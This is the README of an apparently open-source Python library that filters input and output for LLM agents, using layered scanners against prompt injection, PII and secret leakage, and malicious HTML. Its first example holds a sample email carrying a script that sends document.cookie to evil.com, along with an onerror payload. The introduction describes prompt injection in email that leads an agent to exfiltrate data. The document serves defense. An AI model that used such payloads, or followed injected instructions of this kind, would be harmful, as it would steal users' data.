# llm_io_guard

**Layered content safety pipeline for LLM agents.**

[![Python 3.12+](https://img.shields.io/badge/python-3.12+-blue.svg)](https://python.org)
[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)

---

AI agents increasingly operate with access to private data, process untrusted external content, and execute real-world actions (send emails, modify databases, call APIs). This creates what Simon Willison calls the **"lethal trifecta"**: private data + untrusted content + external actions. A single prompt injection in an incoming email could instruct the agent to exfiltrate confidential data, send unauthorized messages, or modify critical records.

`llm_io_guard` is a Python library that scans both **input** (before the LLM sees it) and **output** (before the agent acts on LLM responses). It combines fast deterministic sanitization, ML-based detection, and LLM-based judgment into a tiered, fail-fast pipeline that runs in under 600ms.

## Installation

```bash
# Core package -- Tier 1 scanners only (~5MB, no ML dependencies)
pip install llm-io-guard

# With Prompt Guard 2 ML model (~2GB, requires torch)
pip install llm-io-guard[ml]

# With PII detection (Presidio + spaCy)
pip install llm-io-guard[pii]

# With LLM Judge (Anthropic Claude)
pip install llm-io-guard[llm-judge]

# With URL scanning (Google Safe Browsing)
pip install llm-io-guard[url]

# Everything
pip install llm-io-guard[all]
```

If using the PII detector, also download the required spaCy models:
```bash
python -m spacy download nl_core_news_lg
python -m spacy download en_core_web_lg
```

Install from source for development:
```bash
uv sync --all-extras
```

## Quick Start

### Example 1: Input filtering (HTML sanitization)

An incoming email contains a script injection. The `HtmlSanitizer` strips it and flags the content:

```python
from llm_io_guard import InputFilter
from llm_io_guard.scanners.html_sanitizer import HtmlSanitizer

email = (
    '<p>Hi team,</p><p>Meeting at 10am.</p>'
    '<script>fetch("https://evil.com/steal?d="+document.cookie)</script>'
    '<img src=x onerror="alert(1)">'
)

input_filter = InputFilter()
input_filter.add(HtmlSanitizer())
result = input_filter.filter(email)

print(f"Action:     {result.action.value}")
print(f"Safe text:  {result.text!r}")
print(f"Flagged by: {[r.scanner_name for r in result.flagged_by]}")
```

```
Action:     flag
Safe text:  'Hi team,Meeting at 10am.'
Flagged by: ['html_sanitizer']
```

The scanner returned **FLAG** because over 80% of the HTML consisted of script tags and event handlers. `result.text` contains the cleaned version with only readable text. Note that `result.is_safe` returns `False` for FLAG results (it only returns `True` for PASS) -- use `result.action != Action.BLOCK` to check whether to proceed with sanitized content.

### Example 2: Output filtering (secret leakage)

An LLM response accidentally includes an API key. The `PiiDetector` catches it:

> Requires: `pip install llm-io-guard[pii]` and `python -m spacy download en_core_web_lg`

```python
from llm_io_guard import OutputFilter
from llm_io_guard.scanners.pii_detector import PiiDetector

llm_response = (
    "Here are the deployment settings:\n"
    "  API_KEY=sk-proj-abc123def456ghi789jkl012mno345p\n"
    "  REGION=us-east-1"
)

output_filter = OutputFilter()
output_filter.add(PiiDetector())
result = output_filter.filter(llm_response)

print(f"Action:     {result.action.value}")
print(f"Blocked by: {[r.scanner_name for r in result.blocked_by]}")
print(f"Reason:     {result.blocked_by[0].description}")
```

```
Action:     block
Blocked by: ['pii_detector']
Reason:     Secret(s) detected: SECRET_API_KEY
```

The scanner returned **BLOCK**, preventing the API key from reaching the user or downstream system. BLOCK results short-circuit the pipeline -- no further scanners run.

> **Async usage:** All methods have async counterparts with an `a` prefix. Use `await input_filter.afilter(email)` instead of `input_filter.filter(email)` in async contexts.

## Architecture

The pipeline uses a tiered architecture where fast, deterministic checks run first. If content fails any tier, processing stops immediately (fail-fast).

```
+---------------------------------------------------------+
|                  INCOMING CONTENT                        |
|            (email, web page, document)                   |
+-----------------------+---------------------------------+
                        |
                        v
+---------------------------------------------------------+
|  TIER 1: Fast Sanitization (<5ms, deterministic)        |
|  +---------------+ +----------------+ +----------------+ |
|  | Invisible     | | HTML           | | XML Safe       | |
|  | Text Strip    | | Sanitizer      | | Parser         | |
|  +---------------+ +----------------+ +----------------+ |
+-----------------------+---------------------------------+
                        | PASS
                        v
+---------------------------------------------------------+
|  TIER 2: ML & Pattern Detection (<50ms, parallel)       |
|  +---------------+ +----------------+ +----------------+ |
|  | Prompt        | | PII &          | | URL &          | |
|  | Guard 2       | | Presidio       | | Phishing       | |
|  +---------------+ +----------------+ +----------------+ |
+-----------------------+---------------------------------+
                        | PASS
                        v
+---------------------------------------------------------+
|  TIER 3: LLM Judge (<500ms, conditional)                |
|  +--------------------------------------------------+   |
|  | Claude Haiku 4.5 -- content safety classifier    |   |
|  | (only for high-risk sources)                      |   |
|  +--------------------------------------------------+   |
+-----------------------+---------------------------------+
                        | PASS
                        v
+---------------------------------------------------------+
|              SAFE CONTENT -> LLM / Agent                |
+---------------------------------------------------------+
```

| Tier | Latency Target | Type | Scanners |
|------|---------------|------|----------|
| 1 -- Fast | <5ms | Deterministic, regex-based | Invisible text, HTML sanitization, XML safe parsing |
| 2 -- Medium | <50ms | ML models, pattern matching | Prompt Guard 2, Presidio PII, URL/phishing detection |
| 3 -- Slow | <500ms | LLM-based | Claude Haiku judge (conditional) |

Tier 1 scanners run **sequentially** because they sanitize content for downstream tiers. Tier 2 scanners run **in parallel** via `asyncio.gather()`. Tier 3 runs **conditionally** -- only for high-risk sources (email, web, unknown) or when Tier 2 flags content.

Total pipeline latency target: **<600ms** (worst case, with Tier 3). Typical case (Tier 1 + 2 only): **<60ms**.

For a deep dive into the pipeline internals, see [docs/architecture.md](docs/architecture.md).

## Scanners

| Scanner | Tier | Description | OWASP Coverage |
|---------|------|-------------|----------------|
| `InvisibleTextScanner` | 1 | Strips zero-width characters, invisible Unicode, and homoglyph obfuscation | LLM01, LLM04 |
| `HtmlSanitizer` | 1 | Sanitizes HTML to plain text, removes scripts and dangerous elements | LLM01, LLM04 |
| `XmlSafeParser` | 1 | Prevents XXE (XML External Entity) attacks using defusedxml | LLM01, LLM04 |
| `PromptGuardScanner` | 2 | Meta Prompt Guard 2 (86M params) for prompt injection detection | LLM01 |
| `PiiDetector` | 2 | Microsoft Presidio with Dutch NER (BSN, phone, postal codes) + secret detection | LLM02, LLM05 |
| `UrlScanner` | 2 | Google Safe Browsing API + homoglyph detection for phishing URLs | LLM01, LLM02 |
| `LlmJudgeScanner` | 3 | Claude Haiku 4.5 content safety classifier for high-risk sources | LLM01, LLM07, LLM09 |

## Configuration

Scanners are configured via constructor keyword arguments:

```python
from llm_io_guard.scanners.prompt_guard import PromptGuardScanner
from llm_io_guard.scanners.pii_detector import PiiDetector
from llm_io_guard.scanners.llm_judge import LlmJudgeScanner

PromptGuardScanner(threshold_block=0.9, threshold_flag=0.7)
PiiDetector(threshold_block=0.9, threshold_flag=0.7)
LlmJudgeScanner(threshold_block=0.8, threshold_flag=0.5, model="claude-haiku-4-5")
```
  
### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `LLM_IO_GUARD_LOG_LEVEL` | Log level | `INFO` |
| `LLM_IO_GUARD_MAX_CONTENT_LENGTH` | Max input chars | `100000` |
| `LLM_IO_GUARD_MODEL_DIR` | Model cache directory | `~/.cache/llm_io_guard` |
| `GOOGLE_SAFE_BROWSING_API_KEY` | Google Safe Browsing API key | -- |
| `ANTHROPIC_API_KEY` | Anthropic API key (for LLM judge) | -- |

## Extending

`llm_io_guard` is designed to be extended with custom scanners. Any class that implements the `Scanner` ABC can be plugged into the pipeline.

- [**Custom Scanners Guide**](docs/custom-scanners.md) -- step-by-step guide to building your own scanner, with a full worked example, testing patterns, and tier selection guidelines
- [**Architecture Deep Dive**](docs/architecture.md) -- how the pipeline executes, content mutation, error handling, and InputFilter vs OutputFilter internals

## OWASP Top 10 for LLM Applications (2025)

| # | OWASP Risk | Direction | Filter | Status |
|---|-----------|-----------|--------|--------|
| LLM01 | Prompt Injection | Input | Prompt Guard 2 + Haiku Judge | Covered |
| LLM02 | Sensitive Information Disclosure | Input + Output | Presidio PII + Secret detection | Covered |
| LLM03 | Supply Chain Vulnerabilities | N/A | Dependency pinning, model hash verification | Partially covered |
| LLM04 | Data and Model Poisoning | Input | Content filtering pipeline | Partially covered |
| LLM05 | Improper Output Handling | Output | PII redaction + output scanning | Covered |
| LLM06 | Excessive Agency | Output | Human-in-the-loop, action allowlisting | Covered |
| LLM07 | System Prompt Leakage | Output | Output scanning for system prompt fragments | Covered |
| LLM08 | Vector and Embedding Weaknesses | -- | -- | Not in scope |
| LLM09 | Misinformation | Output | Haiku judge (limited) | Partially covered |
| LLM10 | Unbounded Consumption | Both | Rate limiting, cost controls | Covered |

## Licenses

This project is licensed under the **MIT License**. See [LICENSE](LICENSE) for details.

Built with Llama

### Third-Party Licenses

This project uses Meta Prompt Guard 2, which is licensed under the **Llama 4 Community License**.

> Llama 4 is licensed under the Llama 4 Community License, Copyright Meta Platforms, Inc. All Rights Reserved.

**Requirements for using Prompt Guard 2:**
- Display "Built with Llama" in your application or documentation
- Usage is limited to organizations with fewer than 700 million monthly active users
- Derived model names must include "Llama"
- Must comply with Meta's [Acceptable Use Policy](https://llama.meta.com/llama3/use-policy/)

| Dependency | License | Link |
|-----------|---------|------|
| Meta Prompt Guard 2 | Llama 4 Community License | [License](https://llama.meta.com/llama3/license/) |
| Microsoft Presidio | MIT | [License](https://github.com/microsoft/presidio/blob/main/LICENSE) |
| spaCy | MIT | [License](https://github.com/explosion/spaCy/blob/master/LICENSE) |
| html-sanitizer | BSD-3-Clause | [License](https://github.com/matthiask/html-sanitizer/blob/main/LICENSE) |
| defusedxml | PSF License | [License](https://github.com/tiran/defusedxml/blob/main/LICENSE) |
| pysafebrowsing | MIT | [License](https://github.com/pysafebrowsing/pysafebrowsing/blob/main/LICENSE) |
| confusable_homoglyphs | MIT | [License](https://github.com/vhf/confusable_homoglyphs/blob/master/LICENSE) |

## Development

```bash
# Install with dev dependencies
make install
# or
uv sync --all-extras

# Run tests
make test

# Run tests with coverage
make test-cov

# Run adversarial tests
uv run pytest -m adversarial

# Format code
make fmt

# Run all linters (ruff, mypy, bandit, pyright)
make lint

# Type checking
make typecheck

# Check docstring coverage
make docs

# Run all development checks
make dev

# Clean temporary files
make clean
```

## API Reference

### `InputFilter` / `OutputFilter`
Builder-pattern filter classes. Orchestrate tiered scanning with fail-fast behavior.
- `add(scanner: Scanner)` -- register a scanner (validates direction compatibility)
- `filter(content: str) -> FilterResult` -- run content through the tiered pipeline (sync)
- `async afilter(content: str) -> FilterResult` -- run content through the tiered pipeline (async)

### `Scanner`
Abstract base class for all content scanners. Extend this to add custom scanners.
- `name: str` -- unique identifier (abstract property)
- `tier: int` -- execution tier 1/2/3 (abstract property)
- `supported_directions: frozenset[str]` -- `"input"`, `"output"`, or both
- `scan(content, metadata) -> ScanResult` -- perform the scan (sync)
- `async ascan(content, metadata) -> ScanResult` -- perform the scan (async, abstract)
- `initialize()` -- optional initialization (sync)
- `async ainitialize()` -- optional async initialization

### Data Classes
- `Action` -- enum: `PASS`, `FLAG`, `BLOCK`
- `ScanResult` -- result from a single scanner (scanner_name, action, confidence, description, details)
- `FilterResult` -- aggregated pipeline result with `is_safe`, `blocked_by`, `flagged_by` properties
- `ContentBlocked` -- exception raised when `on_block="raise"` mode is used

### Action Validation
- `ActionRequest` -- represents an agent action request with category and risk level
- `ActionCategory` -- enum: `READ`, `NOTIFY`, `CREATE`, `MODIFY`, `DELETE`, `SEND`, `EXECUTE`
- `validate_action(action, confirm_callback)` -- validate whether an agent action should be executed (sync)
- `async avalidate_action(action, confirm_callback)` -- validate whether an agent action should be executed (async)

### Rate Limiting
- `RateLimiter` -- token-bucket rate limiter with `max_requests_per_minute` and `max_cost_per_day_usd`

## Author

**Bas Wenneker** -- bas@headingfwd.com
